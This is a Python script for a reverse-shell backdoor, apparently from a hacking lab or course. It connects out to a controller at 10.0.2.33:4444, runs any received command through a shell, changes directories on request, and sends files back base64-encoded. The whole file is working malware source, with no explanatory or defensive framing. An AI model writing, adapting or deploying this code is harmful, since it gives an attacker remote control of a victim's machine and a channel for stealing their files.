#!/usr/bin/env python
import socket
import json
import subprocess
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode().rstrip()
                return json.loads(json_data)
            except ValueError:
                continue

    
    def execute_system_command(command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory(self, path):
        os.chdir(path)
        current = os.getcwd()
        return "[+] Working_directory_changed_to [" + path + "]\n" + current

    def download_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def shell_cmd(self):
        while True:
            try:
                command = self.reliable_receive()
                if command == "exit":
                    command_result = command
                    self.reliable_send(command_result)
                    self.connection.close()
                    break

                elif command == "help":
                    pass
                    command_result = ""
                    self.reliable_send(command_result)

                elif command == "clear":
                    pass
                    command_result = ""
                    self.reliable_send(command_result)

                elif command[0:3] == "cd " and len(command) > 1:

                    command_result = self.change_working_directory(command[3:])
                    self.reliable_send(command_result)
                    continue

                elif command[0:4] == "get ":
                    command_result = self.download_file(command[4:])
                    self.reliable_send(command_result.decode())

                else:
                    command_result = self.execute_system_command(command)
                    self.reliable_send(command_result.decode())

            except ValueError:
                continue


my_backdoor = Backdoor("10.0.2.33", 4444)
my_backdoor.shell_cmd()
